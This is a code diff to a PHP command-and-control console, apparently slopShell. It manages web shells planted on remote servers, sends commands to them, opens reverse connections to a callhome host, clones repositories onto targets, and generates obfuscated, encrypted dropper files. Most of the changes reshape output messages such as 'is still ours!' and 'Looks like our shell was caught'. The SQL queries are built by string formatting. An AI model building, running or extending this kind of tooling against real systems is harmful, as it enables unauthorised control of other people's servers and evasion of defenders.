@@ -23,6 +23,12 @@ $cof = array(
     ),
 
 );
+const response_array = array(
+    "default" => PHP_EOL . "\e[1;33m%s%s Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\e[0m" . PHP_EOL,
+    "200" => PHP_EOL . "\e[1;31m%s%s Your useragent was not the correct one... did you forget??\e[0m" . PHP_EOL,
+    "404" => PHP_EOL . "\e[0;31m%s%s Looks like our shell was caught... sorry..\e[0m" . PHP_EOL,
+    "500" => PHP_EOL . "\e[0;32m%s%s is still ours!\e[0m" . PHP_EOL
+);
 //todo need to figure out why this is no longer working on raspi
 //$te = system("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &");
 is_file("includes/config/sloppy_config.ini") ? define("config", parse_ini_file('includes/config/sloppy_config.ini', true)) : define("config", $cof);
@@ -87,13 +93,7 @@ function logo($last, $cl, bool $error, $error_value, string $lastHost)
         echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
         print(sprintf("\033[33;40m  Last Host -> %s", $lastHost) . "\033[0m\n");
         if ($error === true && !empty($error_value)) {
-            if (is_array($error_value)) {
-                echo("\033[33;40m  What was the error:                                                           \033[0m\n");
-                echo "\t" . print_r($error_value);
-                echo "\n";
-            } else {
-                echo("\033[33;40m  User Supplied Values:\n$error_value                                                           \033[0m\n");
-            }
+                echo("\033[1;37;44m  What was the error: {$error_value}                                  \033[0m".PHP_EOL);
         }
         menu();
     }
@@ -370,9 +370,12 @@ function sys($host)
                     echo $syst;
                     break;
                 default:
-                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
+                    logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
+                    print(sprintf(response_array['default'], $axX[0],$axX[1]));
             }
 
+        }else{
+            logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
         }
     } else {
         logo('s', clears, true, "Host and/or URI was empty, please double check.", $host);
@@ -420,13 +423,16 @@ function rev($host, $port, $method, $callhome)
         if (!curl_errno(CHH)) {
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
-                    logo('co', clears, false, '', $axX[0]);
+                    logo('co', clears, false, '', $axX[0].$axX[1]);
                     echo $syst;
                     break;
                 default:
-                    logo('co', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n", $axX[0]);
+                    logo('co',clears,true, 'Reverse Connection Failed double check handler.', $axX[0].$axX[1]);
+                    print(sprintf(response_array['default'], $axX[0],$axX[1]));
             }
 
+        }else{
+            logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
         }
     } else {
         logo('reverse', clears, true, '', $host);
@@ -469,25 +475,26 @@ function co($command, $host, bool $encrypt)
         if (!curl_errno(CHH)) {
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
-                    logo('co', clears, false, '', $axX[0]);
+                    logo('co', clears, false, '', sprintf('%s%s', $axX[0],$axX[1]));
                     echo $syst;
                     break;
                 default:
-                    logo('co', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n", $axX[0]);
+                    logo('co',clears,true, '', sprintf('%s%s', $axX[0],$axX[1]));
+                    print(sprintf(response_array['default'], $axX[0],$axX[1]));
             }
 
+        }else{
+            logo('co', clears, true, "{$command} Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0] . $axX[1]);
         }
     } else {
-        $error = array(
-            "Command" => $command,
-        );
-        logo('co', clears, true, $error, $host);
+        logo('co', clears, true, "Something went wrong.", '');
     }
     return 0;
 }
 
 function clo($host, $repo, $uri)
 {
+    menu();
     if (!empty($host) && !empty($repo) && !empty($uri)) {
         $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tc);
@@ -502,9 +509,11 @@ function clo($host, $repo, $uri)
         if (!curl_errno(CHH)) {
             switch ($http_code) {
                 case 200:
+                    logo('co',clears,false, '', sprintf('%s%s', $axX[0],$axX[1]));
                     return $re;
                 default:
-                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
+                    logo('co',clears,true, 'Clone Failed.', sprintf('%s%s', $axX[0],$axX[1]));
+                    print(sprintf(response_array['default'], $axX[0],$axX[1]));
             }
         } else {
             $errors = array(
@@ -552,8 +561,10 @@ function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
                     pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, xorkey) VALUES ('%s', '%s', '%s', '%s', '%s', '%s')", $rtValues['Output File'], $depth, $obfsucate, $duration, $rtValues['Key'] . "." . $rtValues['IV'] . "." . $rtValues['tag'], $rtValues['XOR Key']));
                     $inDB->countUsedDomains($callHome);
                     system("ls -lah includes/droppers/dynamic/obfuscated");
+                    print("\n\nPress M to return to the menu.\n");
                     break;
                 case "n":
+                    menu();
                     $n = "includes/droppers/dynamic/raw/" . bin2hex(random_bytes(rand(5, 25))) . ".php";
                     print("Generated Dropper will be: {$n}\n");
                     $rtValues = $t->begin_junk($file_in, 0, $n, "n", false, $callHome, $callhomePort, 1000, $slop);
@@ -589,15 +600,17 @@ function aHo($host, $os, $checkIn)
     if (!empty($host)) {
         $path = parse_url($host);
         if ($t->insertRecord($path['scheme'] . "://" . $path['host'] . ":" . $path['port'], $path['path'], $os, $checkIn, $uuid = '', $action = 'add') != 0) {
-            echo "Successfully added: $host";
+            logo('co',clears,false, '', sprintf('%s', $path['host'].$path['port'].":".$path['path']));
+            echo "\n\nSuccessfully added: $host";
         } else {
-            echo "There was an error. Double checking the database.";
             if (!$t->checkDB()) {
-                echo "There is a sevre error in the db, you need to ensure you have it crated.";
-                echo "Attempting to re-create or create the DB.";
+                logo('co',clears,true, 'No Database?', sprintf('%s', $host));
+                echo "\n\nThere is a sevre error in the db, you need to ensure you have it crated.";
+                echo "\nAttempting to re-create or create the DB.";
                 $t->createDB();
             } else {
-                echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
+                logo('co',clears,true, 'Duplicate Host', sprintf('%s', $host));
+                echo "\n\nSeems as though the information supplied, was bad..\nOr the host already is in the DB.";
                 $t->getRecord($host);
             }
         }
@@ -659,6 +672,7 @@ function awesomeMenu(string $what)
 function check($host, $path, $batch)
 {
     if ($batch === "y") {
+        logo('co',clears,false, '','');
         $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
         $rows = pg_fetch_all(pg_exec(pg_connect(DBCONN), "SELECT check_in,rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL"));
         echo "Pulling: " . pg_fetch_result($count, null, null) . "\nThis could take awhile.";
@@ -670,23 +684,20 @@ function check($host, $path, $batch)
             curl_setopt(CHH, CURLOPT_URL, $r['rhost'] . $r['uri'] . "?qs=cqS");
             curl_exec(CHH);
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
-                case 200:
-                    echo "{$r['rhost']}{$r['uri']} is still ours!\n";
-                    pg_exec(pg_connect(DBCONN), sprintf("UPDATE sloppy_bots_main SET check_in = '%s' WHERE rhost = '%s'",  (int)$r['check_in'] + 1,$r['rhost']));
-                    break;
-                case 404:
-                    echo "{$r['rhost']}{$r['uri']}\nLooks like our shell was caught... sorry..\n";
-                    echo "Returned Status: ".curl_getinfo(CHH, CURLINFO_HTTP_CODE)."\n";
-                    break;
-                case 500:
-                    echo "{$r['rhost']}{$r['uri']}\nYour useragent was not the correct one... did you forget??\n";
-                    echo "Returned Status: ".curl_getinfo(CHH, CURLINFO_HTTP_CODE)."\n";
-                    break;
-                default:
-                    echo "Hmm. A status other than what i was looking for was returned on {$r['rhost']}{$r['uri']}, please manually confirm the shell was uploaded.\n";
-                    echo "Returned Status: ".curl_getinfo(CHH, CURLINFO_HTTP_CODE)."\n";
-                    break;
-            }
+                    case 200:
+                        print(sprintf(response_array['200'], $r['rhost'],$r['uri']));
+                        pg_exec(pg_connect(DBCONN), sprintf("UPDATE sloppy_bots_main SET check_in = '%s' WHERE rhost = '%s'",  (int)$r['check_in'] + 1,$r['rhost']));
+                        break;
+                    case 404:
+                        print(sprintf(response_array['404'], $r['rhost'],$r['uri']));
+                        break;
+                    case 500:
+                        print(sprintf(response_array['500'], $r['rhost'],$r['uri']));
+                        break;
+                    default:
+                        print(sprintf(response_array['default'], $r['rhost'],$r['uri']));
+                        break;
+                    }
         }
     } elseif ($batch === "n") {
         if (!empty($host) && !empty($path)) {
@@ -700,16 +711,20 @@ function check($host, $path, $batch)
             if (!curl_errno(CHH)) {
                 switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                     case 200:
-                        echo $axX[0] . $axX[1] . " is still ours!\n";
+                        logo('co',clears,false, '', sprintf('%s', $axX[0].$axX[1]));
+                        print(sprintf(response_array['200'], $axX[0],$axX[1]));
                         break;
                     case 404:
-                        echo $axX[0] . $axX[1] . "\nLooks like our shell was caught... sorry..\n";
+                        logo('co',clears,true, 'Shell not found.', sprintf('%s', $axX[0].$axX[1]));
+                        print(sprintf(response_array['404'], $axX[0],$axX[1]));
                         break;
                     case 500:
-                        echo $axX[0] . $axX[1] . "\nYour useragent was not the correct one... did you forget??\n";
+                        logo('co',clears,true, 'Bad User Agent', sprintf('%s', $axX[0].$axX[1]));
+                        print(sprintf(response_array['500'], $axX[0],$axX[1]));
                         break;
                     default:
-                        echo $axX[0] . $axX[1] . "\nHmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
+                        logo('co',clears,true, 'Server still running??', sprintf('%s', $axX[0].$axX[1]));
+                        print(sprintf(response_array['default'], $axX[0],$axX[1]));
                         break;
                 }
             }
@@ -778,7 +793,7 @@ echo "[ ++ ] Checking for updates [ ++ ]".PHP_EOL;
 if (strstr(getcwd(), "slopShell") == true) {
     system("git pull");
 } else {
-    $homie = readline("Where is slopshell downloaded to?->");
+    $homie = readline("Where is slopshell downloaded to?(full path)->");
     system("cd {$homie} && git pull");
 }
 while ($run) {
